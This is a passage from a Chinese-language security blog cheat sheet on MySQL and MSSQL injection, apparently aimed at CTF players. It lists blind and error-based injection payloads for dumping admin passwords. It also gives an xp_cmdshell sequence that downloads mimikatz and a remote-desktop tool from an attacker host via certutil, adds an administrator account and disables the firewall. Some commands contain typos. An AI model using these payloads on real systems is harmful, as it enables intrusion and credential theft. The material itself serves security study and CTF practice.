</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>substr</span><span class=p>(</span><span class=k>user</span><span class=p>()</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=n>substr</span><span class=p>(</span><span class=k>user</span><span class=p>()</span><span class=k>from</span><span class=w> </span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>yz</span><span class=w> </span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=n>substr</span><span class=p>(</span><span class=k>user</span><span class=p>()</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>150</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>同时也可以利用替换函数</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=k>left</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=mi>2</span><span class=p>)</span><span class=o>&gt;</span><span class=s1>&#39;tf&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>selete</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>testtable</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>selete</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>testtable</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>2</span><span class=w> </span><span class=k>offset</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=比较符号绕过>比较符号绕过</h4><p>过滤了<code>></code>或者<code>&lt;</code>，我们可以用<code>greatest</code>或者<code>least</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>greatest</span><span class=p>(</span><span class=n>ascii</span><span class=p>(</span><span class=n>mid</span><span class=p>(</span><span class=k>user</span><span class=p>(),</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>)),</span><span class=mi>150</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>least</span><span class=p>(</span><span class=n>ascii</span><span class=p>(</span><span class=n>mid</span><span class=p>(</span><span class=k>user</span><span class=p>(),</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>)),</span><span class=mi>150</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=字符串比较函数>字符串比较函数</h4><ul><li>strcmp(expr1,expr2) 如果两个字符串是一样则返回 0 ，如果第一个小于第二个则返回 -1</li><li>find_in_set(str,strlist) 如果相同则返回 1，不同则返回 0</li></ul><h4 id=字符串连接函数>字符串连接函数</h4><ul><li>concat(str1,str2) 将字符串首尾相连</li><li>concat_ws(separator,str1,str2) 将字符串用指定连接符连接</li><li>group_concat()</li></ul><h3 id=运算符>运算符</h3><h4 id=算术运算符>算术运算符</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>+ - * /
</span></span></code></pre></td></tr></table></div></div><h4 id=比较运算符>比较运算符</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>= &lt;&gt; != &gt; &lt;
</span></span></code></pre></td></tr></table></div></div><ul><li>between<ul><li>select database() between 0x61 and 0x7a;</li><li>select database() between &lsquo;a&rsquo; and &lsquo;z&rsquo;;</li></ul></li><li>in<ul><li>select &lsquo;123&rsquo; in (&lsquo;12&rsquo;) => 0</li></ul></li><li>Like(模糊匹配)<ul><li>select &lsquo;12345&rsquo; like &lsquo;12%&rsquo; => true</li></ul></li><li>regexp 或 rlike(正则匹配)<ul><li>select &lsquo;123455&rsquo; regexp &lsquo;^12&rsquo; => true</li></ul></li></ul><h4 id=逻辑运算符>逻辑运算符</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>not或! 非  
</span></span><span class=line><span class=cl>AND 逻辑与 == &amp;&amp;
</span></span><span class=line><span class=cl>OR 逻辑或 == ||
</span></span><span class=line><span class=cl>XOR 逻辑异或 == ^
</span></span></code></pre></td></tr></table></div></div><h4 id=位运算符>位运算符</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&amp; 按位与
</span></span><span class=line><span class=cl>| 按位或
</span></span><span class=line><span class=cl>^ 按位异或
</span></span><span class=line><span class=cl>! 取反
</span></span><span class=line><span class=cl>&lt;&lt; 左移
</span></span><span class=line><span class=cl>&gt;&gt;右移
</span></span></code></pre></td></tr></table></div></div><h2 id=reference>Reference</h2><p><a class=link href=http://www.yulegeyu.com/2017/04/16/%E5%BD%93%E8%A1%A8%E5%90%8D%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E4%BA%86Describe%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82/ target=_blank rel=noopener>当表名可控的注入遇到了Describe时的几种情况</a></p><p><a class=link href=https://uknowsec.cn/posts/notes/MySQL%20Error%20Based%20SQL%20Injection%20%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89%E6%80%BB%E7%BB%93.html target=_blank rel=noopener>MySQL Error Based SQL Injection （报错注入）总结</a></p><p><a class=link href=https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/ target=_blank rel=noopener>MySql注入备忘录</a></p><p><a class=link href=http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/ target=_blank rel=noopener>SQL注入备忘录</a></p><p><a class=link href=http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/ target=_blank rel=noopener>SQL注入绕过技巧</a></p><h1 id=mssql>MSSQL</h1><h2 id=basic-1>Basic</h2><h3 id=系统库>系统库</h3><div class=table-wrapper><table><thead><tr><th>系统数据库</th><th>描述</th></tr></thead><tbody><tr><td><a class=link href="https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/master-database?view=sql-server-2017" target=_blank rel=noopener>master 数据库</a></td><td>记录 SQL Server实例的所有系统级信息。这个数据库包括所有的配置信息、用户登录信息、当前正在服务器中运行的进程的信息。</td></tr><tr><td><a class=link href="https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/msdb-database?view=sql-server-2017" target=_blank rel=noopener>msdb 数据库</a></td><td>用于 SQL Server 代理计划警报和作业。msdb数据库是SQL Server中的一个特例。如果你查看这个数据库的实际定义，会发现它其实是一 个用户数据库。不同之处是SQL Server拿这个数据库来做什么。所有的任务调度、报警、操作员都存储在msdb数据库中。该库的另一个功能是用来存储所有备份历史。SQL Server Agent将会使用这个库。</td></tr><tr><td><a class=link href="https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/model-database?view=sql-server-2017" target=_blank rel=noopener>model 数据库</a></td><td>用作 SQL Server实例上创建的所有数据库的模板。 对 <strong>model</strong> 数据库进行的修改（如数据库大小、排序规则、恢复模式和其他数据库选项）将应用于以后创建的所有数据库。model数据库是建立所有用户数据库时的模板。当你建立一个新数据库时，SQL Server会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满。</td></tr><tr><td><a class=link href="https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/resource-database?view=sql-server-2017" target=_blank rel=noopener>Resource 数据库</a></td><td>一个只读数据库，包含 SQL Server包括的系统对象。 系统对象在物理上保留在 <strong>Resource</strong> 数据库中，但在逻辑上显示在每个数据库的 <strong>sys</strong> 架构中。</td></tr><tr><td><a class=link href="https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/tempdb-database?view=sql-server-2017" target=_blank rel=noopener>tempdb 数据库</a></td><td>一个工作空间，用于保存临时对象或中间结果集。tempdb数据库是一个非常特殊的数据库，供所有来访问你的SQL Server的用户使用。这个库用来保存所有的临时表、存储过程和其他SQL Server建立的临时用的东西。例如，排序时要用到 tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建◊永远不要在tempdb数据库建立需要永久保存的表。</td></tr></tbody></table></div><h3 id=注释-1>注释</h3><div class=table-wrapper><table><thead><tr><th>参数</th><th>风格</th></tr></thead><tbody><tr><td>/*</td><td>C语言风格</td></tr><tr><td>&ndash;</td><td>SQL注释风格</td></tr><tr><td>;%00</td><td>空字节</td></tr></tbody></table></div><h3 id=查询语句>查询语句</h3><h4 id=主机名>主机名</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>select @@SERVERNAME;
</span></span></code></pre></td></tr></table></div></div><h4 id=数据库版本>数据库版本</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>select @@VERSION
</span></span></code></pre></td></tr></table></div></div><h4 id=数据库名>数据库名</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>select db_name()
</span></span></code></pre></td></tr></table></div></div><h4 id=数据库ip地址>数据库ip地址</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>select local_net_address from sys.dm_exec_connextions where Session_id=@@spid
</span></span></code></pre></td></tr></table></div></div><h4 id=暴当前表中的列>暴当前表中的列</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>article.asp?id=6 group by admin.username having 1=1--
</span></span><span class=line><span class=cl>article.asp?id=6 group by admin.username,admin.password having 1=1--
</span></span></code></pre></td></tr></table></div></div><h4 id=暴任意表和列>暴任意表和列</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>and (select top 1 name from (select top N id,name from sysobjects where xtype=char(85)) T order by id desc)&gt;1
</span></span><span class=line><span class=cl>and (select top col_name(object_id(&#39;admin&#39;),N) from sysobjects)&gt;1
</span></span></code></pre></td></tr></table></div></div><h4 id=暴数据库数据>暴数据库数据</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>and (select top 1 password from admin where id=N)&gt;1
</span></span></code></pre></td></tr></table></div></div><h4 id=exmaples>Exmaples</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>query: SELECT username, password FROM Users WHERE id = &#39;1&#39;;
</span></span><span class=line><span class=cl>1&#39; HAVING 1=1                                       -- 错误
</span></span><span class=line><span class=cl>1&#39; GROUP BY username HAVING 1=1--                   -- 错误
</span></span><span class=line><span class=cl>1&#39; GROUP BY username, password HAVING 1=1--         -- 正确
</span></span><span class=line><span class=cl>Group By可以用来测试列名
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>USE master
</span></span><span class=line><span class=cl>GO
</span></span><span class=line><span class=cl>RECONFIGURE --先执行一次刷新，处理上次的配置
</span></span><span class=line><span class=cl>GO
</span></span><span class=line><span class=cl>EXEC sp_configure &#39;show advanced options&#39;,1 --启用xp_cmdshell的高级配置
</span></span><span class=line><span class=cl>GO
</span></span><span class=line><span class=cl>RECONFIGURE --刷新配置
</span></span><span class=line><span class=cl>GO
</span></span><span class=line><span class=cl>EXEC sp_configure &#39;xp_cmdshell&#39;,1  --打开xp_cmdshell,可以调用SQL系统之外的命令
</span></span><span class=line><span class=cl>GO
</span></span><span class=line><span class=cl>RECONFIGURE
</span></span><span class=line><span class=cl>GO
</span></span><span class=line><span class=cl>--使用xp_cmdshell在D盘创建一个myfile 文件夹
</span></span><span class=line><span class=cl>EXEC xp_cmdshell &#39;mkdir d:\myfile&#39;,no_output --[no_output]表示是否输出信息
</span></span><span class=line><span class=cl>GO
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sp_configure &#39;show advanced options&#39;,1; (记得reconfigure) 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sp_configure &#39;xp_cmdshell&#39;,1;（记得reconfigure）启用xp_cmdshell
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>exec xp_cmdshell &#39;dir c:\ /s /b |findstr &#34;key&#34;|findstr &#34;txt&#34;&#39;; 找到key的位置
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>exec xp_cmdshell &#39;type key位置&#34;&#39;; 直接读key内容，不过一般不会让你有直接读的权限
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>exec xp_cmdshell &#39;cacls c:\ /s /b |findstr &#34;key&#34;|findstr &#34;txt&#34; /E /G adminstrator:F&#39;; 改变文件操作权限，F是所有权限，改变权限后再读就能成功
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>exec xp_cmdshell &#39;certutil -urlcache -f -split http://本机:8000/3389.exe&#39;; 这里的certutil的方式与基础题4中的curl思路相同，可参考。这里上传的是开启3389的工具。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>exec xp_cmdshell &#39;net user username password /add&#39;;exec xp_cmdshell &#39;net localgroup administrators username /add&#39;;创建账户
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>exec xp_cmdshell &#39;netsh firewall set opmode disable&#39;; 如果目标开了防火墙，那么即使开启3389端口也无法连接，这条命令用于关闭防火墙。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>exec xp_cmdshell &#39;certutil -urlcache -f -split http://本机:8000/mimikazts.exe&#39;;如果不能建立账户，那么需要工具去破解系统账户的密码。这里使用的mimikazts。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>exec master..xp_cmdshell ‘dir “C:\Documents and Settings\Administrator\桌面\” /A -D /B’
</span></span><span class=line><span class=cl>exec xp_cmdshell ‘type “C:\Documents and Settings\Administrator\桌面\key.txt”‘
</span></span></code></pre></td></tr></table></div></div><h2 id=reference-1>Reference</h2><p><a class=link href=https://www.anquanke.com/post/id/86011 target=_blank rel=noopener>【技术分享】MSSQL 注入攻击与防御</a></p></section><footer class=article-footer><section class=article-tags><a href=/tags/sec/>Sec</a>
<a href=/tags/sql%E6%B3%A8%E5%85%A5/>Sql注入</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section><br><div class="notice tip"><p class=notice-title><span class="icon-notice baseline"><svg viewBox="300.5 134 300 300"><path d="M551.281 252.36c0-3.32-1.172-6.641-3.515-8.985l-17.774-17.578c-2.344-2.344-5.469-3.711-8.789-3.711-3.32.0-6.445 1.367-8.789 3.71l-79.687 79.493-44.141-44.14c-2.344-2.344-5.469-3.712-8.79-3.712-3.32.0-6.444 1.368-8.788 3.711l-17.774 17.579c-2.343 2.343-3.515 5.664-3.515 8.984s1.172 6.445 3.515 8.789l70.704 70.703c2.343 2.344 5.664 3.711 8.789 3.711 3.32.0 6.64-1.367 8.984-3.71l106.055-106.056c2.343-2.343 3.515-5.468 3.515-8.789zM600.5 284c0 82.813-67.188 150-150 150-82.813.0-150-67.188-150-150 0-82.813 67.188-150 150-150 82.813.0 150 67.188 150 150z"/></svg>
</span>Tip</p><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://zeddyu.github.io/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p></div></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/web-for-pentest/><div class=article-details><h2 class=article-title>Web For Pentest</h2></div></a></article><article><a href=/p/sqli-lab-challenges-write-up/><div class=article-details><h2 class=article-title>Sqli-lab Challenges Write up</h2></div></a></article><article><a href=/p/sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%951-53/><div class=article-details><h2 class=article-title>Sqli-lab速刷记录(1-53)</h2></div></a></article><article><a href=/p/the-end-of-afr/><div class=article-details><h2 class=article-title>The End of AFR</h2></div></a></article><article><a href=/p/a-magic-way-of-xss-in-http/2/><div class=article-details><h2 class=article-title>A Magic Way of XSS in HTTP/2</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//ZeddYu.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2025 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.29.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.zdy.one/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer integrity="sha256-Hpo7r9hGztTDRdCEs1X7jHuudXAcM4+KH4qCx4ATeCY=" crossorigin=anonymous></script><script>(function(){const e=document.createElement("link");e.href="https://googlefonts.zeddyu-lu.workers.dev/fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("https://zeddyu.github.io/sw.min.3e39d12263b24e3c46a8d580c9ff2781500296e154ca0809820b5be9b9135220.js").then(function(e){console.log("ServiceWorker registration successful with scope: ",e.scope)},function(e){console.log("ServiceWorker registration failed: ",e)})})</script></body></html>